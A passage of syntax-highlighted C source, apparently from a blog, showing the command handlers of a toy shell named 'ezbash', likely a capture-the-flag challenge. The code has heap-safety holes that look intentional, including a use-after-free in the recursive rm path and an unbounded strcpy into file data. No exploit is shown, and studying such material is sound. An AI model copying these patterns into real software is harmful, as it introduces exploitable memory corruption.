class="line">                    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;an unexpected error occurred\n&quot;</span>);</span><br><span class="line">                <span class="built_in">strcpy</span>(name_list-&gt;echo_data, command_list[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                fwrite(<span class="string">&quot;ezbash: object must be directory\n&quot;</span>, <span class="number">1</span>, <span class="number">0x21</span>, <span class="built_in">stderr</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cat</span><span class="params">(<span class="keyword">char</span>** command_list)</span> </span>&#123;</span><br><span class="line">    Command* name_list = current-&gt;name_list;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (command_list[<span class="number">1</span>] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (compare_name(name_list, command_list[<span class="number">1</span>]) == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: %s: No such file or directory\n&quot;</span>, command_list[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (name_list)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strcmp</span>(name_list-&gt;name, command_list[<span class="number">1</span>]) == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (check_isfile(name_list) == <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        fwrite(<span class="string">&quot;ezbash: object must be file\n&quot;</span>, <span class="number">1</span>, <span class="number">0x1c</span>, <span class="built_in">stderr</span>);</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (name_list-&gt;echo_data != <span class="literal">NULL</span>)</span><br><span class="line">                        <span class="built_in">puts</span>(name_list-&gt;echo_data);</span><br><span class="line">                &#125;</span><br><span class="line">                name_list = name_list-&gt;next_name;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;ezbash: no arguments\n&quot;</span>, <span class="number">1</span>, <span class="number">0x15</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(path);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">help</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to ezbash&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Just have fun here!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The following are built in:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">11</span>; ++i)</span><br><span class="line">        <span class="built_in">puts</span>(command_list_system[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rm</span><span class="params">(<span class="keyword">char</span>** command_list)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    Command* name_list;</span><br><span class="line">    Command* name;</span><br><span class="line"></span><br><span class="line">    index = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (command_list[index])</span><br><span class="line">    &#123;</span><br><span class="line">        name_list = current-&gt;name_list;</span><br><span class="line">        key = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(command_list[index], <span class="string">&quot;-r&quot;</span>) == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            index++;</span><br><span class="line">            <span class="keyword">while</span> (name_list)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (command_list[index])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">while</span> (name_list)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(name_list-&gt;name, command_list[index]) == <span class="number">0</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            key = <span class="number">1</span>;</span><br><span class="line">                            <span class="keyword">if</span> (check_isdir(name_list) == <span class="number">0</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash -r: cannot remove: &#x27;%s&#x27; is a file\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span>*)command_list[index]);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="built_in">memset</span>(name_list-&gt;name, <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line">                            name_list-&gt;parent_dir = <span class="number">0</span>;</span><br><span class="line">                            <span class="keyword">if</span> (name_list-&gt;name_list)</span><br><span class="line">                            &#123;</span><br><span class="line">                                name = name_list-&gt;name_list;</span><br><span class="line">                                <span class="keyword">do</span></span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (name-&gt;echo_data)</span><br><span class="line">                                    &#123;</span><br><span class="line">                                        <span class="built_in">free</span>(name-&gt;echo_data);</span><br><span class="line">                                        name-&gt;echo_data = <span class="literal">NULL</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="built_in">free</span>(name);</span><br><span class="line">                                    name = name-&gt;next_name;</span><br><span class="line">                                &#125; <span class="keyword">while</span> (name);</span><br><span class="line">                            &#125;</span><br><span class="line">                            unlink_name(name_list);</span><br><span class="line">                        &#125;</span><br><span class="line">                        name_list = name_list-&gt;next_name;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (index == <span class="number">2</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    fwrite(<span class="string">&quot;ezbash: missing operand\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x18</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                index++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (key == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: &#x27;%s&#x27;: No such file or directory\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span>*)command_list[index]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (name_list)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (command_list[index])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">while</span> (name_list)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(name_list-&gt;name, command_list[index]) == <span class="number">0</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            key = <span class="number">1</span>;</span><br><span class="line">                            <span class="keyword">if</span> (check_isfile(name_list) == <span class="number">0</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: -r not specified; omitting directory &#x27;%s&#x27;\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span>*)command_list[index]);</span><br><span class="line">                                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (name_list-&gt;echo_data)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="built_in">free</span>(name_list-&gt;echo_data);</span><br><span class="line">                                name_list-&gt;echo_data = <span class="literal">NULL</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            unlink_name(name_list);</span><br><span class="line">                        &#125;</span><br><span class="line">                        name_list = name_list-&gt;next_name;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (index == <span class="number">1</span>) </span><br><span class="line">                &#123;</span><br><span class="line">                    fwrite(<span class="string">&quot;ezbash: missing operand\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x18</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                index++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (key == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: &#x27;%s&#x27;: No such file or directory\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span>*)command_list[index]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cp</span><span class="params">(<span class="keyword">char</span>** command_list)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> var_num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> command_len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> key = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> delim[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">char</span>** command_list_temp = command_list;</span><br><span class="line">    <span class="keyword">char</span>* name_input;</span><br><span class="line">    Command* current_temp = current;</span><br><span class="line">    Command* chunk;</span><br><span class="line">    Command* name_new;</span><br><span class="line">    Command* name_list_a = current-&gt;name_list;</span><br><span class="line">    Command* name_list_b = current-&gt;name_list;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (command_list[<span class="number">1</span>] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(command_list[<span class="number">1</span>], <span class="string">&quot;-r&quot;</span>) != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            name_list_a = current_temp-&gt;name_list;</span><br><span class="line">            key = search_name(&amp;name_list_a, command_list_temp[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span> (key != <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: cannot stat &#x27;%s&#x27;: No such file or directory\n&quot;</span>, command_list_temp[i]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (check_isfile(name_list_a) != <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: -r not specified; omitting directory &#x27;%s&#x27;\n&quot;</span>, command_list_temp[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            key = search_name(&amp;name_list_b, command_list_temp[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">if</span> (key == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (check_isfile(name_list_b) != <span class="number">1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: -r not specified; omitting directory &#x27;%s&#x27;\n&quot;</span>, command_list_temp[<span class="number">1</span>]);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (name_list_a-&gt;echo_data != <span class="literal">NULL</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    copy_echo(name_list_a, name_list_b);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                chunk = malloc_empty();</span><br><span class="line">                name_new = chunk;</span><br><span class="line">                chunk-&gt;key = ISFILE;</span><br><span class="line">                chunk-&gt;parent_dir = current;</span><br><span class="line">                copy_name(chunk, command_list_temp[<span class="number">2</span>]);</span><br><span class="line">                <span class="keyword">if</span> (current-&gt;name_list)</span><br><span class="line">                    insert_name(current-&gt;name_list, name_new);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    current-&gt;name_list = name_new;</span><br><span class="line">                name_list_b = current-&gt;name_list;</span><br><span class="line">                key = search_name(&amp;name_list_b, command_list_temp[<span class="number">2</span>]);</span><br><span class="line">                <span class="keyword">if</span> (key == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;an unexpected error occurred\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (name_list_a-&gt;echo_data != <span class="literal">NULL</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    copy_echo(name_list_a, name_list_b);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (command_list[<span class="number">2</span>] == <span class="literal">NULL</span> || command_list[<span class="number">3</span>] == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                fwrite(<span class="string">&quot;ezbash: no arguments\n&quot;</span>, <span class="number">1</span>, <span class="number">0x15</span>, <span class="built_in">stderr</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            name_list_a = current_temp-&gt;name_list;</span><br><span class="line">            key = search_name(&amp;name_list_a, command_list_temp[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">if</span> (key != <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: cannot stat &#x27;%s&#x27;: No such file or directory\n&quot;</span>, command_list_temp[<span class="number">2</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (check_isdir(name_list_a) != <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash -r: cannot remove: &#x27;%s&#x27; is a file\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span>*)command_list[<span class="number">2</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            key = search_name(&amp;name_list_b, command_list_temp[<span class="number">3</span>]);</span><br><span class="line">            <span class="keyword">if</span> (key == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (check_isdir(name_list_b) != <span class="number">1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash -r: cannot remove: &#x27;%s&#x27; is a file\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span>*)command_list[<span class="number">3</span>]);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                copy_dir(name_list_a, name_list_b);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                chunk = malloc_empty();</span><br><span class="line">                name_list_b = chunk;</span><br><span class="line">                chunk-&gt;key = ISDIR;</span><br><span class="line">                chunk-&gt;parent_dir = current;</span><br><span class="line">                copy_name(name_list_b, command_list_temp[<span class="number">3</span>]);</span><br><span class="line">                <span class="keyword">if</span> (current-&gt;name_list)</span><br><span class="line">                    insert_name(name_list_a, name_list_b);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    current-&gt;name_list = name_list_b;</span><br><span class="line">                copy_dir(name_list_a, name_list_b);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        current = current_temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;ezbash: no arguments\n&quot;</span>, <span class="number">1</span>, <span class="number">0x15</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare_name</span><span class="params">(Command* name_list, <span class="keyword">const</span> <span class="keyword">char</span>* name_input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (name_list)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name_list-&gt;name, name_input))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        name_list = name_list-&gt;next_name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Command* name_list = current-&gt;name_list;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (name_list)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (name_list)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, name_list-&gt;name);</span><br><span class="line">            <span class="keyword">if</span> (!name_list-&gt;key)</span><br><span class="line">                <span class="built_in">putchar</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            name_list = name_list-&gt;next_name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert_name</span><span class="params">(Command* name_list, Command* name_new)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">while</span> (name_list-&gt;next_name)</span><br><span class="line">        name_list = name_list-&gt;next_name;</span><br><span class="line">    name_list-&gt;next_name = name_new;</span><br><span class="line">    name_new-&gt;last_name = name_list;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink_name</span><span class="params">(Command* name_list)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (name_list-&gt;next_name)</span><br><span class="line">    &#123;</span><br><span class="line">        name_list-&gt;next_name-&gt;last_name = name_list-&gt;last_name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (name_list-&gt;last_name)</span><br><span class="line">    &#123;</span><br><span class="line">        name_list-&gt;last_name-&gt;next_name = name_list-&gt;next_name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        current-&gt;name_list = name_list-&gt;next_name;</span><br><span class="line">    &#125;</span><br><span class="line">    name_list-&gt;next_name = <span class="literal">NULL</span>;</span><br><span class="line">    name_list-&gt;last_name = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">free</span>(name_list);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">search_name</span><span class="params">(Command** name_list, <span class="keyword">const</span> <span class="keyword">char</span>* name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (*name_list)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((*name_list)-&gt;name, name))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        *name_list = (*name_list)-&gt;next_name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_name</span><span class="params">(Command* new_chunk, <span class="keyword">const</span> <span class="keyword">char</span>* command_list)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">    len = <span class="built_in">strlen</span>(command_list);</span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">0x10</span>)</span><br><span class="line">        len = <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">memset</span>(new_chunk-&gt;name, <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(new_chunk-&gt;name, command_list, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_echo</span><span class="params">(Command* name_list_a, Command* name_list_b)</span> </span>&#123;</span><br><span class="line">    Command* name_list_temp1 = name_list_a;</span><br><span class="line">    Command* name_list_temp2 = name_list_b;</span><br><span class="line">    <span class="keyword">int</span> len1;</span><br><span class="line">    <span class="keyword">int</span> alloc_len = <span class="number">0x150</span>;</span><br><span class="line">    <span class="keyword">int</span> need_len;</span><br><span class="line">    <span class="keyword">int</span> echo_len_have;</span><br><span class="line">    <span class="keyword">int</span> echo_len_align;</span><br><span class="line"></span><br><span class="line">    len1 = <span class="built_in">strlen</span>(name_list_a-&gt;echo_data);</span><br><span class="line">    <span class="keyword">if</span> (name_list_temp2-&gt;echo_data == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        need_len = (len1 / <span class="number">0x150</span> + <span class="number">1</span>) * <span class="number">0x150</span>;</span><br><span class="line">        alloc_len = need_len;</span><br><span class="line">        name_list_temp2-&gt;echo_data = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(alloc_len);</span><br><span class="line">        <span class="keyword">if</span> (name_list_temp2-&gt;echo_data != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="built_in">memset</span>(name_list_temp2-&gt;echo_data, <span class="number">0</span>, alloc_len);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;an unexpected error occurred\n&quot;</span>);</span><br><span class="line">        <span class="built_in">strncpy</span>(name_list_temp2-&gt;echo_data, name_list_temp1-&gt;echo_data, alloc_len);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        need_len = (len1 / <span class="number">0x150</span> + <span class="number">1</span>) * <span class="number">0x150</span>;</span><br><span class="line">        echo_len_have = <span class="built_in">strlen</span>(name_list_temp2-&gt;echo_data);</span><br><span class="line">        echo_len_align = (echo_len_have / <span class="number">0x150</span> + <span class="number">1</span>) * <span class="number">0x150</span>;</span><br><span class="line">        <span class="keyword">if</span> (need_len &gt; echo_len_align)</span><br><span class="line">        &#123;</span><br><span class="line">            alloc_len = need_len;</span><br><span class="line">            name_list_temp2-&gt;echo_data = (<span class="keyword">char</span>*)<span class="built_in">realloc</span>(name_list_temp2-&gt;echo_data, alloc_len);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">strncpy</span>(name_list_temp2-&gt;echo_data, name_list_temp1-&gt;echo_data, alloc_len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_file</span><span class="params">(Command* name_part_a, Command* name_list_b)</span> </span>&#123;</span><br><span class="line">    Command* part = name_part_a;</span><br><span class="line">    Command* <span class="built_in">list</span> = name_list_b;</span><br><span class="line">    Command* new_name;</span><br><span class="line">    <span class="keyword">char</span>* name;</span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line"></span><br><span class="line">    name = part-&gt;name;</span><br><span class="line">    key = compare_name(<span class="built_in">list</span>, name);</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        new_name = malloc_empty();</span><br><span class="line">        new_name-&gt;key = ISFILE;</span><br><span class="line">        copy_name(new_name, name);</span><br><span class="line">        <span class="keyword">if</span> (part-&gt;echo_data != <span class="literal">NULL</span>)</span><br><span class="line">            copy_echo(part, new_name);</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;name_list)</span><br><span class="line">            insert_name(name_list_b-&gt;name_list, new_name);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            current-&gt;name_list = new_name;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_dir</span><span class="params">(Command* name_list_a, Command* name_list_b)</span> </span>&#123;</span><br><span class="line">    Command* name_part_a = name_list_a-&gt;name_list;</span><br><span class="line">    Command* name_new;</span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">int</span> key_code;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (name_part_a == <span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (name_part_a != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            key = check_isfile(name_part_a);</span><br><span class="line">            <span class="keyword">if</span> (key == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                key = compare_name(name_list_b, name_part_a-&gt;name);</span><br><span class="line">                <span class="keyword">if</span> (key == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    name_new = malloc_empty();</span><br><span class="line">                    name_new-&gt;key = ISFILE;</span><br><span class="line">                    name_new-&gt;parent_dir = name_list_b;</span><br><span class="line">                    copy_name(name_new, name_part_a-&gt;name);</span><br><span class="line">                    <span class="keyword">if</span> (name_part_a-&gt;echo_data)</span><br><span class="line">                    &#123;</span><br><span class="line">                        copy_echo(name_part_a, name_new);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (name_list_b-&gt;name_list)</span><br><span class="line">                        insert_name(name_list_b-&gt;name_list, name_new);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        name_list_b-&gt;name_list = name_new;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                name_new = malloc_empty();</span><br><span class="line">                name_new-&gt;key = ISDIR;</span><br><span class="line">                name_new-&gt;parent_dir = current;</span><br><span class="line">                copy_name(name_new, name_list_b-&gt;name);</span><br><span class="line">                <span class="keyword">if</span> (name_list_b-&gt;name_list)</span><br><span class="line">                    insert_name(name_list_b-&gt;name_list, name_new);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    name_list_b-&gt;name_list = name_new;</span><br><span class="line">                current = name_new;</span><br><span class="line">                copy_dir(name_part_a, name_new);</span><br><span class="line">            &#125;</span><br><span class="line">            name_part_a = name_part_a-&gt;next_name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_isdir</span><span class="params">(Command* 